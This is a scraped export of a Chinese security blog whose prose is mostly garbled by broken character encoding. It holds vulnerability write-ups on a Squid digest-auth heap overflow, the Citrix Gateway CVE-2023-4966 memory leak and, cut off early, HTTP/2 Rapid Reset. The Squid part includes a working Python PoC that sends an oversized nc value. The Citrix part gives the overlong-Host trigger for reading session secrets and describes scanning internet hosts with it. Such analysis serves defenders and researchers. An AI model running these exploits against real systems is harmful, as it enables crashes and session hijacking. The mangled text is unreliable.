checklist=0x55a2e611ec88, start=0x55a2e598bc50) at BoolOps.cc:114 #13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91 #14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171 #15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295 #16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88, callback_=0x55a2e4749b13 \u0026lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)\u0026gt;, callback_data_=0x55a2e611e8b8) at Checklist.cc:254 #17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660 #18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704 #19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608 #20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697 #21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759 #22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284 #23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948 #24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982 #25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183 #26 0x000055a2e48b8250 in CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt;::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190 #27 0x000055a2e48b832b in JobDialer\u0026lt;Server\u0026gt;::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175 #28 0x000055a2e48b8137 in AsyncCallT\u0026lt;CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt; \u0026gt;::fire (this=0x55a2e6117420) at ../../src/base/AsyncCall.h:147 #29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44 #30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27 #31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144 #32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121 #33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83 #34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661 #35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353 #36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341 åœ¨gdbä¸­å¯ä»¥çœ‹åˆ°valueå€¼ä¸ºä¼ å…¥çš„è¯·æ±‚çš„ncçš„å€¼\ngefâ¤ p value $1 = { static npos = 0xffffffffffffffff, size_ = 0x28, len_ = 0x8, static SizeMax_ = 0xffff, buf_ = 0x55a2e6125a60 \u0026#34;00000001\u0026#34; } é•¿åº¦ä¸ºncçš„é•¿åº¦ï¼Œæ­¤æ—¶åªéœ€è¦ncé•¿åº¦è¶…è¿‡ç›®æ ‡ç¼“å†²åŒº digest_request-\u0026gt;ncå³å¯é€ æˆå †æº¢å‡ºã€‚æŸ¥çœ‹ digest_requestå®šä¹‰å¯çŸ¥ncå¤§å°ä¸º9\nclass UserRequest : public Auth::UserRequest { MEMPROXY_CLASS(Auth::Digest::UserRequest); public: UserRequest(); ~UserRequest() override; int authenticated() const override; void authenticate(HttpRequest * request, ConnStateData * conn, Http::HdrType type) override; Direction module_direction() override; void addAuthenticationInfoHeader(HttpReply * rep, int accel) override; #if WAITING_FOR_TE virtual void addAuthenticationInfoTrailer(HttpReply * rep, int accel); #endif void startHelperLookup(HttpRequest *request, AccessLogEntry::Pointer \u0026amp;al, AUTHCB *, void *) override; const char *credentialsStr() override; char *noncehex; /* \u0026#34;dcd98b7102dd2f0e8b11d0f600bfb0c093\u0026#34; */ char *cnonce; /* \u0026#34;0a4f113b\u0026#34; */ char *realm; /* = \u0026#34;testrealm@host.com\u0026#34; */ char *pszPass; /* = \u0026#34;Circle Of Life\u0026#34; */ char *algorithm; /* = \u0026#34;md5\u0026#34; */ char nc[9]; /* = \u0026#34;00000001\u0026#34; */ char *pszMethod; /* = \u0026#34;GET\u0026#34; */ char *qop; /* = \u0026#34;auth\u0026#34; */ char *uri; /* = \u0026#34;/dir/index.html\u0026#34; */ char *response; digest_requestä¸ºAuth::Digest::UserRequestæŒ‡é’ˆï¼Œä½¿ç”¨newåˆ†é…å†…å­˜ï¼Œä½äºå †å†…\nPoCæ„é€ \næ¼æ´ä»£ç å¯¹åº”äºå¤„ç†[[../06 Protocol/HTTP digestèº«ä»½è®¤è¯|HTTP digest è®¤è¯]]ï¼Œé€šè¿‡è¯¥è®¤è¯è¯·æ±‚éœ€è¦å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡ä¸æºå¸¦è®¤è¯å¤´ï¼Œæ­¤æ—¶squidä¼šè¿”å›407ï¼Œéœ€è¦æå–å“åº”ä¸­çš„nonceï¼Œç®€å•çš„ä½¿ç”¨pythonå³å¯æ„é€  PoC\nimport requests from requests.auth import HTTPDigestAuth import random import string import hashlib proxies={ \u0026#39;http\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39;, \u0026#39;https\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39; } resp_407=\u0026#34;\u0026#34;\u0026#34; Digest realm=\u0026#34;localhost\u0026#34;, nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;, qop=\u0026#34;auth\u0026#34;, stale=false\u0026#34;\u0026#34;\u0026#34; rr=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;test\u0026#34;,realm=\u0026#34;localhost\u0026#34;,nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;,uri=\u0026#34;/\u0026#34;,cnonce=\u0026#34;a0824a23a0394203c3023085915fd744\u0026#34;,nc=00000001,response=\u0026#34;b45560b922d64786ef7d6c96c9071dfa\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; data=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;{username}\u0026#34;,realm=\u0026#34;{realm}\u0026#34;,nonce=\u0026#34;{nonce}\u0026#34;,uri=\u0026#34;{uri}\u0026#34;,cnonce=\u0026#34;{cnonce}\u0026#34;,nc={nc},response=\u0026#34;{response}\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; username=\u0026#34;test\u0026#34; password=\u0026#34;123456\u0026#34; realm=\u0026#34;localhost\u0026#34; nc=\u0026#34;00000001\u0026#34;*100 cnonce = \u0026#39;\u0026#39;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32)) ha1 = hashlib.md5((username + \u0026#39;:\u0026#39; + realm + \u0026#39;:\u0026#39; + password).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() ha2= hashlib.md5(\u0026#34;GET:/\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)).hexdigest() resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False) if resp.status_code==407: resp_header = resp.headers nonce = resp_header[\u0026#34;Proxy-Authenticate\u0026#34;].split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;=\u0026#39;)[1].rstrip(\u0026#39;\u0026#34;\u0026#39;).lstrip(\u0026#39;\u0026#34;\u0026#39;) response = hashlib.md5((ha1+\u0026#34;:\u0026#34;+nonce+\u0026#34;:\u0026#34;+nc+\u0026#34;:\u0026#34;+cnonce+\u0026#34;:auth:\u0026#34;+ha2).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() print(\u0026#34;nonce: {}\\tcnonce: {}\\tresponse: {}\u0026#34;.format(nonce,cnonce,response)) rdata = data.format(username=username,realm=realm,nonce=nonce,uri=\u0026#34;/\u0026#34;,cnonce=cnonce,nc=nc,response=response) header = { \u0026#34;Proxy-Authorization\u0026#34;: rdata } print(rdata) resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False,headers=header) print(resp.status_code,resp.text) å°ç»“ ç”±äºsquidä¸ºå¤šè¿›ç¨‹æ¶æ„ï¼Œåœ¨å­è¿›ç¨‹å› ä¸ºæ¼æ´é€€å‡ºæ—¶ï¼Œçˆ¶è¿›ç¨‹ä¼šé‡æ–°ç”Ÿæˆå­è¿›ç¨‹å¤„ç†ä»£ç†è¯·æ±‚ï¼Œå®é™…åˆ©ç”¨æ¯”è¾ƒé¸¡è‚‹ï¼Œä¹Ÿå°±ä¸éš¾ç†è§£è¯¥æ¼æ´æ²¡æœ‰CVEç¼–å·äº†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g\nhttps://datatracker.ietf.org/doc/html/rfc7616\nCreated at 2023-10-26T10:41:55+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/","title":"CVE-2023-4966 Citrix Gateway ä¿¡æ¯æ³„éœ²æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Citrixä¸­å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œç”±äºè¶Šç•Œè¯»å–ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å–åˆ°å­˜å‚¨åœ¨å†…å­˜çš„å¯†é’¥ã€‚\nè¯¥æ¼æ´åœ¨å…«æœˆä¸‹æ—¬è§‚å¯Ÿåˆ°åœ¨é‡åˆ©ç”¨ã€‚\nå…¶ä»–\nè¿™ä¸ªæ¼æ´åœ¨10.19å°±å·²ç»åˆ†æå®Œäº†ï¼Œå½“æ—¶æ‰«æäº†ä¸€ä¸‹å…¬ç½‘å—å½±å“æœåŠ¡å™¨å‘ç°å½±å“æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æ²¡æœ‰å…¬å¼€è¯¦æƒ…ï¼Œåœ¨æ˜¨å¤©å›½å¤–å®‰å…¨ç ”ç©¶å‘˜å…¬å¼€äº†PoCï¼Œæ‰€ä»¥ç°åœ¨æ‰å†™åˆ†ææ–‡ç« ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;Citrix Gateway\u0026#34; å½±å“ç‰ˆæœ¬ NetScaler ADC and NetScaler Gatewayâ€¯14.1â€¯\u0026lt;â€¯14.1-8.50 NetScaler ADC and NetScaler Gatewayâ€¯13.1â€¯\u0026lt;â€¯13.1-49.15 NetScaler ADC and NetScaler Gatewayâ€¯13.0â€¯\u0026lt; 13.0-92.19 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.164 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.300 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.300 ç¯å¢ƒæ­å»º å‚ç…§\rCVE-2023-3519 Citrix Gateway RCEæ­å»º\n14.1-4.42 192.168.52.100\n14.1-8.50 192.168.52.105\n13.1-49.15 192.168.52.95\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆæ­¥åˆ†æ\næ ¹æ®\rå®˜æ–¹é€šå‘Šå¯çŸ¥ä¸¤ä¸ªæ¼æ´éƒ½æ˜¯å¯¹å†…å­˜çš„æ“ä½œä¸å½“é€ æˆçš„ã€‚å¯¹åº”çš„CVSS3åˆ†åˆ«å¦‚ä¸‹\nCVE-2023-4966 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L CVE-2023-4967 CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H ç»¼åˆå¯ä»¥çŸ¥é“å¦‚ä¸‹ä¿¡æ¯ï¼š åˆ©ç”¨æ¼æ´æ— éœ€æƒé™ã€ä½¿ç”¨ç½‘ç»œè¯·æ±‚å³å¯åˆ©ç”¨ã€å‡ä¸ºå†…å­˜å‹æ¼æ´ï¼Œåº”è¯¥è·Ÿ[[CVE-2023-3519 Citrix Gateway RCE|CVE-2023-3519)ç±»ä¼¼ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æ²¡åšæ ¡éªŒï¼Œå…¶ä¸­CVE-2023-4966 åº”è¯¥æ˜¯å®ç°äº†è¶Šç•Œè¯»å–å†…å­˜ã€‚ å‡½æ•°diff diff nsppeæ–‡ä»¶ï¼Œåˆ†æå„ä¸ªå‡½æ•°ä¿®æ”¹çš„åœ°æ–¹ã€‚\nåœ¨é€ä¸ªåˆ†æå„ä¸ªå‡½æ•°ä¹‹åï¼Œç›®å…‰è½¬åˆ°ns_aaa_oauth_send_openid_configå‡½æ•°ã€‚\nåœ¨è¡¥ä¸ä¸­ ns_aaa_oauth_send_openid_configä¸­å¯¹snprintfçš„è¿”å›å€¼åšäº†åˆ¤æ–­ï¼Œåœ¨ä¿®å¤ä¹‹å‰ç›´æ¥å°†snpritfçš„è¿”å›å€¼æ”¾åˆ°äº†ns_vpn_send_responseä¸­ï¼Œä¿®å¤ä¹‹åå…ˆåˆ¤æ–­è¿”å›å€¼æ˜¯å¦å¤§äº1FFFFã€‚\nsnprintfå°†æ ¼å¼åŒ–çš„æ•°æ®ï¼Œå†™å…¥å†…å­˜ä¸­ï¼ŒåŸå‹ä¸ºint snprintf(char *str, int n, char * format [, argument, ...]);ï¼Œå…¶ä¸­nä¸ºè¦å†™å…¥çš„å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ï¼Œsnprintfæœ€å¤šä¼šç»™å†…å­˜å†™å…¥n-1ä¸ªå­—ç¬¦ï¼Œæœ€åä¸€ä¸ªå­—ç¬¦ä½¿ç”¨'\\0'ï¼Œå½“è¦æ ¼å¼åŒ–åçš„å­—ç¬¦ä¸²å¤§äºnæ—¶ï¼Œä¼šåœ¨n-1å¤„æˆªæ–­ã€‚ä½†æ­¤æ—¶ï¼Œsnprintfä¼šè¿”å›æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œä¸æ˜¯å†™å…¥å†…å­˜çš„é•¿åº¦ã€‚\nå‘ä¸Šè¿½æº¯è°ƒç”¨æ ˆï¼Œns_aaa_oauth_send_openid_configè¢« ns_vpn_process_unauthenticated_requestè°ƒç”¨ï¼Œå°† ns_vpn_process_unauthenticated_request ä»£ç ç»™AIåˆ†æè°ƒç”¨åˆ°è¯¥å‡½æ•°çš„è·¯å¾„ï¼Œå¯çŸ¥è°ƒç”¨è·¯å¾„ä¸º /oauth/idp/.well-known/openid-configuration æ­¤å¤„çŒœæµ‹æœªä¿®å¤ç‰ˆæœ¬ä¸­ä¼šä½¿ç”¨snprintfçš„è¿”å›å€¼ä½œä¸ºé•¿åº¦å‚æ•°è¿›è¡Œè¯»å–ã€‚ curlè¯·æ±‚è¯¥æ¥å£ï¼Œå¯ä»¥çœ‹åˆ°å“åº”ä¸­ä¸­ä¼šæŠŠæˆ‘ä»¬è¯·æ±‚çš„hostæ”¾è¿›å»\n$ curl -i -s -k -X $\u0026#39;GET\u0026#39; -H $\u0026#39;Host: curl.test.site\u0026#39; -H $\u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0\u0026#39; -H $\u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\u0026#39; -H $\u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; -H $\u0026#39;Accept-Encoding: gzip, deflate\u0026#39; -H $\u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H $\u0026#39;Sec-Fetch-Dest: document\u0026#39; -H $\u0026#39;Sec-Fetch-Mode: navigate\u0026#39; -H $\u0026#39;Sec-Fetch-Site: none\u0026#39; -H $\u0026#39;Sec-Fetch-User: ?1\u0026#39; -H $\u0026#39;Te: trailers\u0026#39; -H $\u0026#39;Connection: close\u0026#39; -b $\u0026#39;NSC_TASS=/menu/neo\u0026#39; $\u0026#39;https://192.168.52.234/oauth/idp/.well-known/openid-configuration\u0026#39; HTTP/1.1 200 OK X-Content-Type-Options: nosniff X-XSS-Protection: 1; mode=block Content-Length: 717 Cache-control: no-cache, no-store, must-revalidate Pragma: no-cache Content-Type: application/json; charset=utf-8 X-Citrix-Application: Receiver for Web {\u0026#34;issuer\u0026#34;: \u0026#34;https://curl.test.site\u0026#34;, \u0026#34;authorization_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/login\u0026#34;, \u0026#34;token_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oaut h/idp/token\u0026#34;, \u0026#34;jwks_uri\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/certs\u0026#34;, \u0026#34;response_types_supported\u0026#34;: [\u0026#34;code\u0026#34;, \u0026#34;token\u0026#34;, \u0026#34;id_token\u0026#34;], \u0026#34;id_token_signing_alg_va lues_supported\u0026#34;: [\u0026#34;RS256\u0026#34;], \u0026#34;end_session_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/logout\u0026#34;, \u0026#34;frontchannel_logout_supported\u0026#34;: true, \u0026#34;scopes_supported \u0026#34;: [\u0026#34;openid\u0026#34;, \u0026#34;ctxs_cc\u0026#34;], \u0026#34;claims_supported\u0026#34;: [\u0026#34;sub\u0026#34;, \u0026#34;iss\u0026#34;, \u0026#34;aud\u0026#34;, \u0026#34;exp\u0026#34;, \u0026#34;iat\u0026#34;, \u0026#34;auth_time\u0026#34;, \u0026#34;acr\u0026#34;, \u0026#34;amr\u0026#34;, \u0026#34;email\u0026#34;, \u0026#34;given_name\u0026#34;, \u0026#34;family_name\u0026#34;, \u0026#34;nic kname\u0026#34;], \u0026#34;userinfo_endpoint\u0026#34;: \u0026#34;https://curl.test.site/oauth/idp/userinfo\u0026#34;, \u0026#34;subject_types_supported\u0026#34;: [\u0026#34;public\u0026#34;]} å‰é¢çŸ¥é“print_temp_ruleå¤§å°ä¸º0x20000ï¼Œè¿”å›å€¼ä¸­å…±æœ‰6å¤„é‡å¤äº†hostï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ å…¥çš„hosté•¿åº¦\u0026gt;21845(ç²—ç•¥ä¼°è®¡)å°±å¯ä»¥è§¦å‘æº¢å‡ºã€‚å†æ¬¡è¯·æ±‚ï¼Œå‘ç°å¯ä»¥åˆ©ç”¨è¶…é•¿hostè¯»å–åˆ°Citrixå†…å­˜ï¼Œå®é™…æµ‹è¯•å‘ç°hosté•¿åº¦æœ€å¤šåˆ°24100å·¦å³ã€‚\nå€ŸåŠ©è¿™ä¸ªæ¼æ´ï¼Œå†™äº†ä¸€ä¸ªnucleiæ¨¡æ¿å¯¹å…¬ç½‘æ‰«æï¼Œå¯¹å…«ç™¾ä¸ªç‹¬ç«‹IPæ‰«æï¼Œæˆªæ­¢è‡³10.20ï¼Œä»ç„¶æœ‰å¤§çº¦15%æœªä¿®å¤ï¼Œä¸”é€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥è¯»å–åˆ°å†…å­˜ä¸­çš„secretï¼Œåç»­å¯ä»¥å€ŸåŠ©è¿™ä¸ªsecretç»•è¿‡èº«ä»½éªŒè¯ï¼Œè¯·æ±‚åç«¯æ¥å£ã€‚\nè¿™ä¸ªæ¥å£ä¹Ÿåœ¨oauthçš„é…ç½®ä¸­æœ‰æåˆ°\rhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nns_aaa_oauthrp_send_openid_configå‡½æ•°ç±»ä¼¼ï¼Œä¹Ÿsnprintfçš„è¿”å›å€¼åšäº†åˆ¤æ–­ã€‚ è°ƒè¯•\nå…³é—­çœ‹é—¨ç‹—å¯¹nsppeè¿›ç¨‹å‘é€çš„ä¿¡å·ï¼Œè€Œåç›´æ¥åœ¨å¯¹åº”ä½ç½®å¤„ä¸‹æ–­ç‚¹å³å¯ã€‚\nroot@citrix3# nspf help Usage: \u0026#39;/netscaler/nspf ((\u0026lt;process_name\u0026gt; | \u0026lt;pid\u0026gt;) \u0026lt;action\u0026gt; | query)\u0026#39; where \u0026lt;process_name\u0026gt; is one of: NSPPE-00 aslearn awsconfig bgpd de imi isisd metricscollectomonuploadd nsaaad nsaggregatord nscfsyncd nsclfsyncd nsclusterd nsconfigd nscopo nsfsyncd nsgslbautosyncnslcd nslped nsm nsnetsvc nsrised nstraceaggregatnsumond ospf6d ospfd ptpd ripd ripngd snmpd syshealthd root@citrix3# /netscaler/nspf nsppe-00 pbmonitor 0 nspf NSPPE-00 pbmonitor 0 Removing pitboss monitor on process NSPPE-00 pid 37387 PoC\nhttps://github.com/Chestnuts4/POC/blob/master/nuclei_poc/CVE-2023-4966_citrix_info_disclose.yaml å®é™…åˆ©ç”¨\né€šè¿‡æ¼æ´å¯ä»¥è¯»å–åˆ°å†…å­˜ä¸­çš„å·²ç™»å½•ä¼šè¯çš„secretã€‚\nå°ç»“ è¯¥æ¼æ´æ•´ä½“åˆ†æã€åˆ©ç”¨è¾ƒä¸ºç®€å•ï¼Œ é€šè¿‡æœ´å®æ— åçš„è¶Šç•Œè¯»å–å³å¯é€ æˆä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿæ— éœ€è¿›è¡Œå†…å­˜å¸ƒå±€ã€‚å…¶å®æ•´ä½“çœ‹nsppeï¼Œå¾ˆå¤šä½¿ç”¨äº†snprintfçš„åœ°æ–¹éƒ½å¯¹å…¶è¿”å›å€¼è¿›è¡Œäº†åˆ¤æ–­ï¼Œæœ¬æ¬¡æ¼æ´ç‚¹æ²¡æœ‰å¯¹è¿”å›å€¼åšåˆ¤æ–­å¯èƒ½æ˜¯å› ä¸ºå¼€å‘æ—¶é—æ¼äº†ã€‚\nå¦å¤–å³ä½¿ä¿®å¤è¯¥æ¼æ´ä¹‹åï¼Œå·²è¢«åŠ«æŒçš„ä¼šè¯ä»ç„¶æœ‰æ•ˆï¼Œéœ€è¦ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¸…é™¤å·²ç™»å½•çš„ä¼šè¯\nclar lb persistentSessions \u0026lt;vServer\u0026gt; å‚è€ƒé“¾æ¥\nhttps://support.citrix.com/article/CTX579459/netscaler-adc-and-netscaler-gateway-security-bulletin-for-cve20234966-and-cve20234967\nhttps://support.citrix.com/article/CTX234873/how-to-deploy-netscaler-as-both-oauth-sp-and-idp\nhttps://www.citrix.com/downloads/citrix-adc/\nCreated at 2023-10-26T10:18:12+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/","title":"CVE-2023-44487 Http2 Rapid Reset DDOS Attack åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åˆ©ç”¨ HTTP/2 çš„å¤šè·¯å¤ç”¨æµåŠŸèƒ½ï¼Œæ¶æ„æ”»å‡»è€…å¯é€šè¿‡å¿«é€Ÿåˆ›å»ºè¯·æ±‚å¹¶ç«‹å³é‡ç½®è¯·æ±‚ï¼Œç»•è¿‡æœ€å¤§å¹¶å‘æµé™åˆ¶ï¼Œå¯¼è‡´æœåŠ¡å™¨èµ„æºçš„è¿‡åº¦æ¶ˆè€—ã€‚\nå½±å“èŒƒå›´ Go \u0026lt; 1.21.3 Go \u0026lt; 1.20.10\n11.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 11.0.0-M11 10.1.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 10.1.13 9.0.0-M1 \u0026lt;= Apache Tomcat \u0026lt;= 9.0.80 8.5.0 \u0026lt;= Apache Tomcat \u0026lt;= 8.5.9\ngrpc-go \u0026lt; 1.58.3 grpc-go \u0026lt; 1.57.1 grpc-go \u0026lt; 1.56.3\nç¯å¢ƒæ­å»º ä½¿ç”¨goèµ·ä¸€ä¸ªhttp2 serverã€‚\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;net/http\u0026#34; ) func main() { http.HandleFunc(\u0026#34;/\u0026#34;, func(w http.ResponseWriter, r *http.Request) { fmt.Println(r.Proto, r.URL) fmt.Fprint(w, \u0026#34;Hello World!\u0026#34;) }) http.ListenAndServeTLS(\u0026#34;:443\u0026#34;, \u0026#34;certs/cert.pem\u0026#34;, \u0026#34;certs/key.pem\u0026#34;, nil) } ä½¿ç”¨curlæµ‹è¯•æ˜¯å¦æˆåŠŸ curl https://localhost -i -k --http2 -vvvã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨nginxæ­å»ºä¸€ä¸ªhttp2æœåŠ¡å™¨ï¼Œé…ç½®å¾ˆå¤šåšå®¢éƒ½æœ‰å°±ä¸å†™äº†ã€‚\nâœ http curl https://localhost -i -k --http2 -vvv * Trying 127.0.0.1:443... * Connected to localhost (127.0.0.1) port 443 (#0) * ALPN: offers h2,http/1.1 * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 * ALPN: server accepted h2 * Server certificate: * subject: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * start date: Oct 12 08:46:51 2023 GMT * expire date: Oct 9 08:46:51 2033 GMT * issuer: C=XX; ST=StateName; L=CityName; O=CompanyName; OU=CompanySectionName; CN=CommonNameOrHostname * SSL certificate verify result: self-signed certificate (18), continuing anyway. * using HTTP/2 * h2h3 [:method: GET] * h2h3 [:path: /] * h2h3 [:scheme: https] * h2h3 [:authority: localhost] * h2h3 [user-agent: curl/7.88.1] * h2h3 [accept: */*] * Using Stream ID: 1 (easy handle 0x55566530a9e0) \u0026gt; GET / HTTP/2 \u0026gt; Host: localhost \u0026gt; user-agent: curl/7.88.1 \u0026gt; accept: */* \u0026gt; * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): \u0026lt; HTTP/2 200 HTTP/2 200 \u0026lt; content-type: text/plain; charset=utf-8 content-type: text/plain; charset=utf-8 \u0026lt; content-length: 12 content-length: 12 \u0026lt; date: Fri, 13 Oct 2023 06:52:06 GMT date: Fri, 13 Oct 2023 06:52:06 GMT \u0026lt; * Connection #0 to host localhost left intact Hello World!# æŠ€æœ¯åˆ†æ å…¶å®è¿™ä¸ªåœ¨æˆ‘çœ‹æ¥æŸäº›æ–¹é¢çœ‹ä¹Ÿä¸ç®—æ¼æ´ï¼Œæ ¹æ®\rRFC9113è§„å®šï¼Œåœ¨HTTP2 settingé˜¶æ®µæœåŠ¡å™¨å¯ä»¥å£°æ˜æ”¯æŒçš„æœ€å¤§å¹¶å‘æµï¼ŒåŒæ—¶è§„å®šäº†å®¢æˆ·ç«¯æˆ–æœåŠ¡ç«¯å¯ä»¥éšæ—¶å‘é€RST_STREAMä»¥å–æ¶ˆæµï¼Œåœ¨æ”¶åˆ°RST_STREAMæ¥æ”¶æ–¹ä¸èƒ½åœ¨å‘é€å…¶ä»–æ•°æ®ï¼Œé™¤äº†ä¼˜å…ˆçº§ï¼Œåè®®å¹¶æœªè§„å®šå®¢æˆ·ç«¯å‘é€RST_STREAMçš„é˜ˆå€¼ï¼Œé‚£ä¹ˆå„å¤§è¯­è¨€å’Œè½¯ä»¶å®ç°çš„æ—¶å€™å¯èƒ½é™åˆ¶ä¹Ÿæœ‰å¯èƒ½ä¸é™åˆ¶RST_STREAMçš„é˜ˆå€¼ã€‚è¿™å±äºæ˜¯å„è‡ªå®ç°æ–¹å¼çš„é—®é¢˜ã€‚ ä»åè®®å±‚é¢è®²ï¼Œå®¢æˆ·ç«¯ç›´æ¥RST_STREAMæ²¡æœ‰é—®é¢˜ï¼Œå…¸å‹çš„åœºæ™¯æ˜¯ç”¨æˆ·åœ¨æµè§ˆå™¨è®¿é—®ç½‘ç«™æœŸé—´å› ä¸ºæŸäº›åŸå› ç›´æ¥å…³é—­äº†é¡µé¢ï¼Œæ­¤æ—¶æµè§ˆå™¨éœ€è¦å‘æœåŠ¡ç«¯å‘é€RST_STREAMå¸§æ¥å–æ¶ˆæµï¼Œå¯ä»¥å¸®åŠ©æœåŠ¡å™¨èŠ‚çœèµ„æºã€‚\nHTTPçš„å‡ ç§DDOS HTTP 1.1 åœ¨HTTP 